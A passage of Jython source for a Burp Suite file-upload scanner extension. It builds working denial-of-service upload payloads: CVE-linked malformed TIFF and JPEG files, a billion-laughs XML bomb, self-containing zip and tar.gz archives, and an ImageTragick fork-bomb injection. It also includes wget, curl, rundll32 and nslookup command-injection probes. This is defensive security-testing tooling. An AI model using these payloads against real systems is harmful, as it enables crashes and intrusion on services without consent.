                      '\x00\x00\x00\x86\x01\x00\x00\x1b\x03\x00\x01\x00\x00\x00\x01\x03\x00\x01\x00\x00\x00\x00\x04\x00\x00\x17\x01\x04' \
                      '\x00\x01\x00\x00\x00\x98\x00\x00\x00\x1a\x01\x05\x00\x01\x00\x00\x00\x86\x01\x00\x00\x1b\x01\x05\x00\x01\x00\x00' \
                      '\x00\x8e\x01\x00\x00\x1c\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00(\x01\n\x00\x01\x00\x00\x00\x01\x00\x00\x00)' \
                      '\x01\x03\x00\x02\x00\x00\x00\x00\x00\x01\x00@\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x80'
            desc_pil = desc + "The file was created by floyd during an offline fuzzing run with the Python Image Library (PIL/Pillow). " \
                              "On my machine this takes a long time and uses a lot of memory (RAM). Pillow 4.0.0."
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_pil))
            if orig_filename or orig_ct:
                attacks.append(("pythonImageLibrary2.tiff", content, "image/tiff", new_title, desc_pil))

        if injector.opts.file_formats['jpeg'].isSelected():
            content = '\xff\xd80\x00\x1000000000000000\xe1\x00xExif\x00\x00MM\x00*\x00\x00\x00p00000000000000000000000000000000000' \
                      '000000000000000000000000000000000000000000000000000000000000000000000'
            desc_php = desc + "The file was found by Hanno Boeck during a fuzzing run with PHP. " \
                              "See details on https://blog.fuzzing-project.org/43-PHP-EXIF-parser-out-of-bounds-reads-" \
                              "CVE-2016-4542,-CVE-2016-4543,-CVE-2016-4544-and-a-note-on-custom-memory-allocators.html . "
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_php))
            if orig_filename or orig_ct:
                attacks.append(("CVE20164543.jpeg", content, "image/jpeg", new_title, desc_php))

            content = '\xff\xd80\x00\x1000000000000000\xe1\x00\\Exif\x00\x00MM\x00*\x00\x00\x00\x08\x00\x060000\x00\x00\x00\x01000' \
                      '00000\x00\x00\x00\x0100000000\x00\x00\x00\x0100000000\x00\x00\x00\x0400000000\x00\x00\x00\x0100000000\x00' \
                      '\x00\x00\x00000000'
            attacks.append((orig_filename, content, '', new_title, desc_php))
            if orig_filename or orig_ct:
                attacks.append(("CVE20164543.jpeg", content, "image/jpeg", new_title, desc_php))

            content = '\xff\xd80\x00\x1000000000000000\xe1\x00xExif\x00\x00MM\x00*\x00\x00\x00\x08\x00\x060000\x00\x00\x00\x010000' \
                      '0000\x00\x00\x00\x0100000000\x00\x00\x00\x0100000000\x00\x00\x00\x0400000000\x00\x00\x00\x010000\x82\x9800' \
                      '\x00\x00\x00\t\x00\x00\x00f000000000000000000000000\x0000000'
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_php))
            if orig_filename or orig_ct:
                attacks.append(("CVE20164542.jpeg", content, "image/jpeg", new_title, desc_php))

            content = '\xff\xd80\x00\x1000000000000000\xe1\x00\x0cExif\x00\x00MM00'
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_php))
            if orig_filename or orig_ct:
                attacks.append(("CVE20164544.jpeg", content, "image/jpeg", new_title, desc_php))

        if injector.opts.file_formats['jpeg'].isSelected():
            content = '\xff\xd8\xe1\xff\x01\x00\x00\x00'
            desc_java = desc + "The file was found by Rody Kersten during a fuzzing run with Java ImageIO with his " \
                               "AFL-based Kelinci Java fuzzer. See details on https://github.com/isstac/kelinci " \
                               "https://issues.apache.org/jira/browse/IMAGING-203 and " \
                               "http://bugs.java.com/bugdatabase/view_bug.do?bug_id=JDK-8188756. "
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_java))
            if orig_filename or orig_ct:
                attacks.append(("IMAGING-203.jpeg", content, "image/jpeg", new_title, desc_java))

        if injector.opts.file_formats['jpeg'].isSelected():
            content = 'eJz7f+P/AwYBLzdHBwZGRiYGGSBk+H+bwZlBQ0ZOWU5Sg1dRWVdbw8AmxdHG3Nzmf0SsZ8rEhpnT+ht6uhZseXa4f9WttV09J/6fvvXu6////2cffPH//6//z/7+/wEyhFFbV9fG1KbM37Hsx9KepT9wA+' \
                      'vd1tjA/wMMghwsCgwKzIyODEwijMyKjP+PsPw/wqAqwMDExMjCyMzKAAWMTMyCDCxCioZKjoGFwiLGiQuBysQYgYABBTAyAcWlBBkZmJghMr9g4oJCSo7/bzHwAMWZBIGG2TOElRse3SHA25i+MG1Tce0' \
                      'pBYa1klpuJAIPBNOKkFpdMBlOlLnGSOwwGOMCVqWamEJQHSoErfEgqAILCCOsBCtwJaykHsZIcIMlT6hAhptbKLrqRBymAJPqf3IcCAVOxChCJLn/H9HSIFHg/z0yNCEAB24paSKNYKHIAQwMK6G0IKZU' \
                      'PXYd2MMJ5A5EuGJP49iAKZhUiQZTDjiVAQuAX26QlK4HF0xAikiiLYQDT6yi6AEKEmpgwGZ8O5x1BUUcll+RcgEI2OF3TQg4Lf7/yIBhPTJwZMNvCmqqh5vChDXKvgEzGJwjiz2yKU7iuAEo8b8AMVCcT' \
                      'GF6RvYSKpAlJ3/jAu8R9nD8QpaAVLD/0SpYXMaAA/0XLlnKAVK45hNIOPgA3DxhBgZWZgZGWOWOQzUL1uyCG0Sj8DSw2t+AIejihtvfKABPIcsASjAMDHIgxn27GfJwUQF0ZdNm4Q5bN7cKPL5DBAdqzc' \
                      'fAiKkUHqK4C0K09hMei8FgST9z+u+ZoqaTbkR4paTaVk7wSru8pCVQef6cKwvVXe40PpbdGhpWcHWZ+tGt8u08uUJ5Kqzesh/PJmauq/J5tWRawLp3yWoNj95f+AgMHjyhOG2WmWtaSojustmvCg96Mfy' \
                      '5pt3063nf/5sAwnQt6A=='
            content = content.decode("base64").decode("zip")
            desc_java = desc + "The file was found by floyd during a fuzzing run with Java Apache Commons JPEG parser " \
                               "with the AFL-based Kelinci Java fuzzer. See details on " \
                               "https://issues.apache.org/jira/browse/IMAGING-215 "
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_java))
            if orig_filename or orig_ct:
                attacks.append(("IMAGING-215.jpeg", content, "image/jpeg", new_title, desc_java))

        if injector.opts.file_formats['xml'].isSelected():
            content = '<?xml version="1.0"?><!DOCTYPE lolz [ <!ENTITY lol "lol"> <!ELEMENT lolz (#PCDATA)> <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> ' \
                      '<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"> <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> ' \
                      '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"> <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"> ' \
                      '<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"> <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"> ' \
                      '<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"> <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> ' \
                      ']> <lolz>&lol9;</lolz>'
            new_title = title
            desc_lol = desc + "The billion laughs attack, see https://en.wikipedia.org/wiki/Billion_laughs ."
            attacks.append((orig_filename, content, '', new_title, desc_lol))
            if orig_filename or orig_ct:
                attacks.append(("BillionLaughs.xml", content, "application/xml", new_title, desc_lol))
                if orig_ct:
                    attacks.append(("BillionLaughs.xml", content, "text/xml", new_title, desc_lol))

        if injector.opts.file_formats['zip'].isSelected():
            content = 'UEsDBBQAAAAIAAgDZDz59IlkSAEAALgBAAAHAAAAci9yLnppcAAlANr/UEsDBBQAAAAIAAgDZDz59IlkSAEAALgBAAAHAAAAci9yLnppcAAvAND/ACUA2v9QSwMEFAAAAAgACANkPPn0iWRIAQAAuAEAAAcAA' \
                      'AByL3IuemlwAC8A0P/CVI5XOQAFAPr/wlSOVzkABQD6/wAFAPr/ABQA6//CVI5XOQAFAPr/AAUA+v8AFADr/0KIIcQAABQA6/9CiCHEAAAUAOv/QoghxAAAFADr/0KIIcQAABQA6/9CiCHEAAAAAP//AAAA/' \
                      '/8ANADL/0KIIcQAAAAA//8AAAD//wA0AMv/QughXg8AAAD//wrwZmQSYcAV3OigSL9IryqzIMCblQ3EZwRCUwYGBkAABgD5/20BAAAAAELoIV4PAAAA//8K8GZkEmHAFdzooEi/SK8qsyDAm5UNxGcEQlMGB' \
                      'gZAAAYA+f9tAQAAAABQSwECFAAUAAAACAAIA2Q8+fSJZEgBAAC4AQAABwAAAAAAAAAAAAAAAAAAAAAAci9yLnppcFBLBQYAAAAAAQABADUAAABtAQAAAAA='
            content = content.decode("base64")
            new_title = title
            desc_rzip = desc + "A zip file r.zip that contains itself. See https://research.swtch.com/zip ."
            attacks.append((orig_filename, content, '', new_title, desc_rzip))
            if orig_filename or orig_ct:
                attacks.append(("r.zip", content, "application/zip", new_title, desc_rzip))

        if injector.opts.file_formats['gzip'].isSelected():
            content = 'H4sIAAAAAAAAACrSL9IrSSzSS69ioBkwAAIzExMgbQ7hI4mbGhuB2YYo6k0MzcwZFGDqRgHtgHw3B5QFAAAA//8APADD/yrSL9IrSSzSS69ioBkwAAIzExMgbQ7hI4mbGhuB2YYo6k0MzcwZFGDqRgHtgHw3B' \
                      '5QFAAAA//8APADD/0LoJV0vAAUA+v9C6CVdLwAFAPr/AAUA+v8AFADr/0LoJV0vAAUA+v8ABQD6/wAUAOv/QoghxAAAFADr/0KIIcQAABQA6/9CiCHEAAAUAOv/QoghxAAAFADr/0KIIcQAAAAA//8AAAD//' \
                      'wAnANj/QoghxAAAAAD//wAAAP//ACcA2P/CVIZVGQAAAP//AAgA9/8PYlI2AAgAAGIYBaNgFIyCQQ0AAQAA///CVIZVGQAAAP//AAgA9/8PYlI2AAgAAGIYBaNgFIyCQQ0AAQAA//8PYlI2AAgAAA=='
            content = content.decode("base64")
            new_title = title
            desc_rgz = desc + "A tar.gz file r.tar.gz that contains itself. See https://research.swtch.com/zip ."
            attacks.append((orig_filename, content, '', new_title, desc_rgz))
            if orig_filename or orig_ct:
                attacks.append(("r.tar.gz", content, "application/gzip", new_title, desc_rgz))
                if orig_ct:
                    attacks.append(("r.tar.gz", content, "application/x-tar", new_title, desc_rgz))

        if injector.opts.file_formats['mvg'].isSelected():
            content = "push graphic-context\n" \
                      "viewbox 0 0 " + str(injector.opts.image_width) + " " + str(injector.opts.image_height) + "\n" \
                      "fill 'url(" + BurpExtender.MARKER_CACHE_DEFEAT_URL + "`:(){ :|:& };:`)'\npop graphic-context"
            new_title = title
            desc_fork_bomb = desc + "An ImageTragick CVE-2016-3714 injection with a fork bomb as a payload."
            attacks.append((orig_filename, content, '', new_title, desc_fork_bomb))
            if orig_filename or orig_ct:
                attacks.append(("image.jpeg", content, "image/jpeg", new_title, desc_fork_bomb))

        for filename, content, content_type, title, desc in attacks:
            req = injector.get_request(filename, content, content_type)
            if req:
                resp = self._make_http_request(injector, req, report_timeouts=False)
                if not resp:
                    # connection timeout occured
                    base_request_response = injector.get_brr()
                    brr = CustomRequestResponse("", "", base_request_response.getHttpService(),
                                                req, None)
                    csi = self._create_issue_template(brr, title, desc, "Tentative", "Medium")
                    self._add_scan_issue(csi)

    # Helper functions
    def _filename_to_expected(self, filename):
        # TODO feature: maybe try to download both?
        # For filenames that include %00 or \x00 we assume we require the server to truncate there
        # so we want to redownload the truncated file name:
        for nullstr in ("%00", "\x00"):
            if nullstr in filename:
                filename = filename[:filename.index(nullstr)]
        return filename

    def _get_rce_interaction_commands(self, injector, burp_colab):
        # Format: name, command, server_placeholder, replace
        # Rules for payloads regarding command injection: While a nslookup is sufficient (Windows and Unix) and we wouldn't
        # need wget or curl we also need to keep people in mind that use Burp Collaborator IP configs in internal networks.
        # There might be no option to detect DNS interactions, therefore wget and curl are still valid payloads in certain
        # scenarios. It also means that we have to handle that case.
        # configs etc. In general we would like to do:
        # inbound response based (e.g. nslookup stdout or PHP string concat stdout detection) - always
        # inbound sleep (unix) and ping -n (windows) for timeout detection - always
        # nslookup (unix and windows) for Collaborator interaction - always
        # wget and curl (unix) and rundll32 (windows) for IP Collaborators - and as UI option (disabled by default)

        # When is wget and curl better than nslookup?
        # 1. When we have a Burp Collaborator configured as an IP (no DNS Collaborator) - autodetected in this extension
        # 2. When the server is not allowed to do DNS queries, but allowed to connect to a proxy that does DNS queries
        if burp_colab.is_ip_collaborator or injector.opts.wget_curl_payloads:
            yield "Wget", "wget -O-", BurpExtender.MARKER_COLLAB_URL, None
            yield "Curl", "curl", BurpExtender.MARKER_COLLAB_URL, None
            yield "Rundll32", "rundll32 url.dll,FileProtocolHandler", BurpExtender.MARKER_COLLAB_URL, None
            # yield "msiexec", "msiexec /a", BurpExtender.MARKER_COLLAB_URL, None
        else:
            yield "Nslookup", "nslookup", "test.example.org", "test.example.org"

    def _get_sleep_commands(self, injector):
        if injector.opts.sleep_time > 0:
            # payloads being sent?
            # Format: name, command, factor, args
            # Unix
            yield "Sleep", "sleep", 1, ""
            # Windows
            yield "Ping", "ping -n", 2, " localhost"

    def _send_get_request(self, brr, relative_url, create_log):
        # Simply tries to send brr but as a GET request and to a different URL
        service = brr.getHttpService()
        iRequestInfo = self._helpers.analyzeRequest(brr)
        new_req = "GET " + relative_url + " HTTP/1.1" + BurpExtender.NEWLINE
        headers = iRequestInfo.getHeaders()
        # very strange, Burp seems to include the status line in .getHeaders()...
        headers = headers[1:]
        new_headers = []
        for header in headers:
            is_bad_header = False
            for bad_header in BurpExtender.REDL_URL_BAD_HEADERS:
                if header.lower().startswith(bad_header):
                    is_bad_header = True
                    break
            if is_bad_header:
                continue
            new_headers.append(header)
        new_headers.append("Accept: */*")

        new_headers = BurpExtender.NEWLINE.join(new_headers)
        new_req += new_headers
        new_req += BurpExtender.NEWLINE * 2

        new_req = new_req.replace("${RANDOMIZE}", str(random.randint(100000000000, 999999999999)))
        attack = self._callbacks.makeHttpRequest(service, new_req)
        resp = attack.getResponse()
        if resp and create_log:
            # create a new log entry with the message details
            self.add_log_entry(attack)

    # TODO: Refactor _send methods into their own class
    def _send_simple(self, injector, all_types, basename, content, redownload=False, randomize=True):
        i = 0
        types = injector.get_types(all_types)
        urrs = []
        for prefix, ext, mime_type in types:
            if randomize:
                number = str(i) + ''.join(random.sample(string.ascii_letters, 3))
            else:
                number = ""
            sent_filename = prefix + basename + number + ext
            new_content = content.replace(BurpExtender.MARKER_CACHE_DEFEAT_URL, "https://example.org/" + ''.join(random.sample(string.ascii_letters, 11)) + "/")
            req = injector.get_request(sent_filename, new_content, content_type=mime_type)
            i += 1
            if req:
                x = self._filename_to_expected(sent_filename)
                if redownload:
                    urrs.append(self._make_http_request(injector, req, redownload_filename=x))
                else:
                    urrs.append(self._make_http_request(injector, req))
        return urrs

    def _send_collaborator(self, injector, burp_colab, all_types, basename, content, issue, redownload=False,
                           replace=None, randomize=True):
        colab_tests = []
        types = injector.get_types(all_types)
        i = 0
        for prefix, ext, mime_type in types:
            break_when_done = False
            for prot in BurpExtender.PROTOCOLS_HTTP:
                colab_url = burp_colab.generate_payload(True)
                if callable(replace):
                    # we got a function like object we need to call with the content and collaborator URL
                    # to get the collaborator injected content
                    new_content = replace(content, prot + colab_url + "/")
                    new_basename = basename
                elif type(replace) is list or type(replace) is tuple:
                    # we got a list of string that has to be replaced with the collaborator URL
                    new_content = content
                    new_basename = basename
                    already_found = []
                    for repl in replace:
                        if not repl:
                            if BurpExtender.MARKER_COLLAB_URL not in content and \
                            BurpExtender.MARKER_COLLAB_URL not in new_basename and \
                            BurpExtender.MARKER_COLLAB_URL not in already_found:
                                print "Warning: Magic marker {} (looped) not found in content or filename of " \
                                      "_send_collaborator:\n {} {}".format(BurpExtender.MARKER_COLLAB_URL, repr(content), repr(basename))
                            already_found.append(BurpExtender.MARKER_COLLAB_URL)
                            new_content = new_content.replace(BurpExtender.MARKER_COLLAB_URL, prot + colab_url + "/")
                            new_basename = new_basename.replace(BurpExtender.MARKER_COLLAB_URL, prot + colab_url + "/")
                        else:
                            if repl not in content and repl not in new_basename and repl not in already_found:
                                print "Warning: Marker", repl, "not found in content or filename of _send_collaborator:\n", repr(content), repr(basename)
                            already_found.append(repl)
                            new_content = new_content.replace(repl, colab_url)
                            new_basename = new_basename.replace(repl, colab_url)
                    # We don't need the different prot here, so break the inner loop over the protocols once sent
                    break_when_done = True
                elif replace:
                    # we got a string that has to be replaced with the collaborator URL
                    # no protocol here!
                    if replace not in content and replace not in basename:
                        print "Warning: Magic marker (str)", replace, "not found in content or filename of _send_collaborator:\n", repr(content), repr(basename)
                    new_content = content.replace(replace, colab_url)
                    new_basename = basename.replace(replace, colab_url)
                    # We don't need the different prot here, so break the inner loop over the protocols once sent
                    break_when_done = True
                else:
                    # the default is we simply replace BurpExtender.MARKER_COLLAB_URL with a collaborator URL
                    if BurpExtender.MARKER_COLLAB_URL not in content and BurpExtender.MARKER_COLLAB_URL not in basename:
                        print "Warning: Magic marker (default) {} not found in content or filename of " \
                              "_send_collaborator:\n {} {}".format(BurpExtender.MARKER_COLLAB_URL, repr(content), repr(basename))
                    new_content = content.replace(BurpExtender.MARKER_COLLAB_URL, prot + colab_url + "/")
                    new_basename = basename.replace(BurpExtender.MARKER_COLLAB_URL, prot + colab_url + "/")
                if randomize:
                    number = str(i) + ''.join(random.sample(string.ascii_letters, 3))
                else:
                    number = ""
                new_content = new_content.replace(BurpExtender.MARKER_CACHE_DEFEAT_URL, "https://example.org/" + ''.join(random.sample(string.ascii_letters, 11)) + "/")
                filename = prefix + new_basename + number + ext
                req = injector.get_request(filename, new_content, content_type=mime_type)
                i += 1
                if req:
                    x = self._filename_to_expected(filename)
                    if redownload:
                        urr = self._make_http_request(injector, req, redownload_filename=x)
                    else:
                        urr = self._make_http_request(injector, req)
                    if urr:
                        colab_tests.append(ColabTest(colab_url, urr, issue))
                if break_when_done:
                    break
        return colab_tests

    def _send_sleep_based(self, injector, basename, content, types, sleep_time, issue, redownload=False, randomize=True):
        types = injector.get_types(types)
        timeout_detection_time = (float(sleep_time) / 2) + 0.5
        i = 0
        for prefix, ext, mime_type in types:
            if randomize:
                number = str(i) + ''.join(random.sample(string.ascii_letters, 3))
            else:
                number = ""
            filename = prefix + basename + number + ext
            expected_filename = self._filename_to_expected(filename)
            new_content = content.replace(BurpExtender.MARKER_CACHE_DEFEAT_URL, "https://example.org/" + ''.join(random.sample(string.ascii_letters, 11)) + "/")
            req = injector.get_request(filename, new_content, content_type=mime_type)
            i += 1
            if req:
                start = time.time()
                if redownload:
                    resp = self._make_http_request(injector, req, throttle=False, redownload_filename=expected_filename)
                else:
                    resp = self._make_http_request(injector, req, throttle=False)
                if resp and time.time() - start > timeout_detection_time:
                    # found a timeout, let's confirm with a changed request so it doesn't get a cached response
                    print "TIMEOUT DETECTED! Now checking if really a timeout or just a random timeout. " \
                          "Request leading to first timeout was:"
                    print repr(req)
                    if randomize:
                        number = str(i) + ''.join(random.sample(string.ascii_letters, 3))
                    else:
                        number = ""
                    filename = prefix + basename + number + ext
                    expected_filename = self._filename_to_expected(filename)
                    # A feature to prevent caching of responses to identical requests
                    new_content = content.replace(BurpExtender.MARKER_CACHE_DEFEAT_URL, "https://example.org/" + ''.join(random.sample(string.ascii_letters, 11)) + "/")
                    req = injector.get_request(filename, new_content, content_type=mime_type)
                    i += 1
                    if req:
                        start = time.time()
                        if redownload:
                            resp = self._make_http_request(injector, req, throttle=False, redownload_filename=expected_filename)
                        else:
                            resp = self._make_http_request(injector, req, throttle=False)
                        if resp and time.time() - start > timeout_detection_time:
                            csi = issue.create_copy()
                            csi.httpMessagesPy.append(resp.upload_rr)
                            self._add_scan_issue(csi)
                            # Returning here is an option, but actually knowing all different kind of injections is nicer
                            # return
                        else:
                            print "Unfortunately, this seems to be a false positive... not reporting"

    def _create_issue_template(self, base_request_response, name, detail, confidence, severity):
        service = base_request_response.getHttpService()
        url = self._helpers.analyzeRequest(base_request_response).getUrl()
        csi = CustomScanIssue([base_request_response], name, detail, confidence, severity, service, url)
        return csi

    def _make_http_request(self, injector, req, report_timeouts=True, throttle=True, redownload_filename=None):
        if injector.opts.redl_enabled and injector.opts.scan_controler.requesting_stop:
            print "User is requesting stop..."
            raise StopScanException()

        #sys.stdout.write(".")
        #sys.stdout.flush()

        # A little feature, allowing to randomize requests where ${RANDOMIZE} is present
        # To make sure the length of the request doesn't change, replace
        # ${RANDOMIZE}
        # with a numeric value between
        # 100000000000
        # and
        # 999999999999
        # Btw: that's a 12 digit number, and the last dash delimited number of a UUID is also 12 digits...

        req = req.replace("${RANDOMIZE}", str(random.randint(100000000000, 999999999999)))
        base_request_response = injector.get_brr()
        service = base_request_response.getHttpService()
        # print "_make_http_request", service
        attack = self._callbacks.makeHttpRequest(service, req)
        resp = attack.getResponse()
        if resp:
            resp = FloydsHelpers.jb2ps(resp)
            upload_rr = CustomRequestResponse('', '', service, req, resp)
            urr = UploadRequestsResponses(upload_rr)
            if injector.opts.create_log:
                # create a new log entry with the message details
                self.add_log_entry(upload_rr)
            if redownload_filename and injector.opts.redl_enabled and injector.opts.redl_configured:
                preflight_rr, download_rr = injector.opts.redownloader_try_redownload(resp, redownload_filename)
                urr.preflight_rr = preflight_rr
                urr.download_rr = download_rr
                if injector.opts.create_log:
                    # create a new log entry with the message details
                    if urr.preflight_rr:
                        self.add_log_entry(urr.preflight_rr)
                    if urr.download_rr:
                        self.add_log_entry(urr.download_rr)
        else:
            urr = None
            if report_timeouts:
                print "Adding informative for request timeout"
                desc = "A timeout occured when uploading a file. This could mean that you did memory exhaustion or " \
                       "a DoS attack on some component of the website. Or it was just a regular timeout. Check manually."
                service = base_request_response.getHttpService()
                url = self._helpers.analyzeRequest(base_request_response).getUrl()
                brr = CustomRequestResponse("", "", base_request_response.getHttpService(), req, None)
                csi = CustomScanIssue([brr, ], "File upload connection timeout", desc, "Certain", "Information",
                                      service, url)
                self._add_scan_issue(csi)
        if throttle and injector.opts.throttle_time > 0.0:
            time.sleep(injector.opts.throttle_time)
        return urr


class FloydsHelpers(object):
    @staticmethod
    def fix_content_length(headers, length, newline):
        h = list(headers.split(newline))
        for index, x in enumerate(h):
            if "content-length:" == x[:len("content-length:")].lower():
                h[index] = x[:len("content-length:")] + " " + str(length)
                return newline.join(h)
        else:
            print "WARNING: Couldn't find Content-Length header in request, simply adding this header"
            h.insert(1, "Content-Length: " + str(length))
            return newline.join(h)

    @staticmethod
    def file_extension(insertionPoint):
        base_value = insertionPoint.getBaseValue()
        if base_value:  # getBaseValue() returns None in rare cases
            return FloydsHelpers.u2s(os.path.splitext(base_value)[1])
        else:
            return ''

    @staticmethod
    def mime_type_from_ext(ext):
        return mimetypes.guess_type(ext, False)[0]

    @staticmethod
    def mime_type_from_content(filepath):
        type_extension = imghdr.what(filepath)
        # Problem here is that python's magic module is not in the standard libraries
        # if not type_extension:
        #     try:
        #         import magic
        #         mime = magic.Magic(mime=True)
        #         type_extension = mime.from_file(filepath)
        #     except:
        #         pass
        # So let's instead the new Java 7 probeContentType
        if not type_extension:
            java_type = Files.probeContentType(filepath)
            if java_type:
                type_extension = java_type
        return type_extension

    @staticmethod
    def file_extension_from_mime(mime_type):
        return FloydsHelpers.u2s(mimetypes.guess_extension(mime_type, False))

    @staticmethod
    def jb2ps(arr):
        """
        Turns Java byte arrays into Python str
        :param arr: [65, 65, 65]
        :return: 'AAA'
        """
        return ''.join(map(lambda x: chr(x % 256), arr))

    @staticmethod
    def ps2jb(arr):
        """
        Turns Python str into Java byte arrays
        :param arr: 'AAA'
        :return: [65, 65, 65]
        """
        return [ord(x) if ord(x) < 128 else ord(x) - 256 for x in arr]

    @staticmethod
    def u2s(uni):
        """
        Turns unicode into str/bytes. Burp might pass invalid Unicode (e.g. Intruder Bit Flipper).
        This seems to be the only way to say "give me the raw bytes"
        :param uni: u'https://example.org/invalid_unicode/\xc1'
        :return: 'https://example.org/invalid_unicode/\xc1'
        """
        if isinstance(uni, unicode):
            return uni.encode("iso-8859-1", "ignore")
        else:
            return uni

    @staticmethod
    def between_markers(content, start, end, with_markers=False):
        if not isinstance(content, str) or not isinstance(start, str) or not isinstance(end, str):
            print "Warning: Trying to find between_markers of type {} {} {}, " \
                  "which are: {} {} {}".format(type(content), type(start), type(end), content, start, end)
        if start and end and start in content and end in content:
            try:
                if with_markers:
                    start_index = content.index(start)
                    end_index = content.index(end, start_index + len(start)) + len(end)
                else:
                    start_index = content.index(start) + len(start)
                    end_index = content.index(end, start_index)
                if end_index:
                    return content[start_index:end_index]
            except ValueError:
                return ""
        return ""

class ImageHelpers(object):
    # As Python Pillow uses Python native C extensions and as Jython doesn't support that (yet)
    # we can not simply make Python pillow a dependency.
    # Pillow solution was simply:
    # img = Image.open(BytesIO(content))
    # img = img.resize(size)
    # content = BytesIO()
    # img.save(content, format=ext[1:])
    # content.seek(0)
    # content = content.read()

    # Therefore going the Java way here.
    # But then we also don't want to use external libraries for Java, so we have to stick with
    # ImageIO. But ImageIO only supports tiff from JDK 1.9 onwards... a little messy
    @staticmethod
    def get_imageio(content):
        try:
            input_stream = ByteArrayInputStream(content)
            io = ImageIO.read(input_stream)
            if io: #  ImageIO returns None if the file couldn't be parse (eg. tiff for JDK < 1.9)
                # Now also determine if this is a png, jpeg, tiff or whatever:
                readers = ImageIO.getImageReaders(ImageIO.createImageInputStream(ByteArrayInputStream(content)))
                if readers.hasNext():
                    fileformat = readers.next().getFormatName()
                    return io, fileformat
                else:
                    print "Exception in get_imageio, ImageIO seems to be able to read an image but not get a ImageReader for it"
            else:
                # print "Not a valid image in get_imageio"
                pass
        except Exception, e:
            print "Couldn't do get_imageio"
            print e
        return None, None

    @staticmethod
    def image_width_height(content):
        try:
            io, fileformat = ImageHelpers.get_imageio(content)
            if io:
                return io.getWidth(), io.getHeight(), fileformat
        except Exception, e:
            print "Couldn't do image_width_height"
            print e
        return None, None, None

    @staticmethod
    def rescale_image(width, height, content):
        output = ""
        try:
            io, fileformat = ImageHelpers.get_imageio(content)
            if io and fileformat:
                scaled_image = BufferedImage(width, height, BufferedImage.TYPE_INT_RGB)
                graphics2D = scaled_image.createGraphics()
                #If we would need better quality...
                #graphics2D.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR)
                #graphics2D.setRenderingHint(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_QUALITY)
                #graphics2D.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON)
                graphics2D.drawImage(io, 0, 0, width, height, None)
                graphics2D.dispose()
                output_stream = ByteArrayOutputStream()
                ImageIO.write(scaled_image, fileformat, output_stream)
                output = FloydsHelpers.jb2ps(output_stream.toByteArray())
            else:
                # print "Not a valid image in rescale_image"
                pass
        except Exception, e:
            print "Exception in rescale_image called with {} {} {}, but simply ignoring and going on".format(width, height, repr(content[:100]))
            print e
        return output

    @staticmethod
    def get_image_rgb_list(content):
        output = []
        try:
            io, fileformat = ImageHelpers.get_imageio(content)
            if io and fileformat:
                width = io.getWidth()
                heigth = io.getHeight()
                output = io.getRGB(0, 0, width, heigth, None, 0, width)
                # turn Java array into list..
                output = [x for x in output]
        except Exception, e:
            print "Exception in get_image_rgb_list called with {}, but simply ignoring and going on".format(repr(content[:100]))
            print e
        return output

    @staticmethod
    def get_image_from_rgb_list(width, height, type_ext, rgbs):
        content = ""
        try:
            img = BufferedImage(width, height, BufferedImage.TYPE_INT_RGB)
            img.getRaster().setDataElements(0, 0, width, height, array(rgbs,'i'))
            output_stream = ByteArrayOutputStream()
            ImageIO.write(img, type_ext, output_stream)
            output = FloydsHelpers.jb2ps(output_stream.toByteArray())
        except Exception, e:
            print "Exception in get_image_from_rgb_list called with {}, but simply ignoring and going on".format(repr(rgbs[:100]))
            print e
        return output

    @staticmethod
    def is_grayscale(content):
        all_grayscale = True
        try:
            io, fileformat = ImageHelpers.get_imageio(content)
            if io and fileformat:
                ras = io.getRaster()
                elem = ras.getNumDataElements()
                width = io.getWidth()
                height = io.getHeight()
                for i in range(0, width):
                    for j in range(0, height):
                        pixel = io.getRGB(i, j)
                        red = (pixel >> 16) & 0xff
                        green = (pixel >> 8) & 0xff
                        blue = (pixel) & 0xff
                        if red != green or green != blue:
                            all_grayscale = False
                            break
                    if not all_grayscale:
                        break
        except Exception, e:
            print "Exception in is_grayscale called with {}, but simply ignoring and going on".format(repr(content[:100]))
            print e
        return all_grayscale


    @staticmethod
    def new_image(width, height, type_ext):
        output = ""
        try:
            color = random.randint(1, 2147483600)
            buffered_image = BufferedImage(width, height, BufferedImage.TYPE_INT_RGB)
            g2d = buffered_image.createGraphics()
            g2d.setColor(Color(color))
            g2d.fillRect(0, 0, width, height)

            output_stream = ByteArrayOutputStream()
            ImageIO.write(buffered_image, type_ext, output_stream)
            output = FloydsHelpers.jb2ps(output_stream.toByteArray())
        except Exception, e:
            print "Exception in new_image called with {} {} {}, but simply ignoring and going on".format(width, height, type_ext)
            print e
        return output


class StopScanException(Exception):
    pass

class BurpCollaborator:
    # The actual size returned by a BurpCollaboratorClientContext starts with 31 and quickly goes up to 32
    # I haven't seen more than that in practice. According to the Burp guys, 33 seems to be a reasonable choice as:
    # 31 chars up to 15 IDs, 32 up to 255, then 33 up to 4095, then 34 up to 65536, etc.
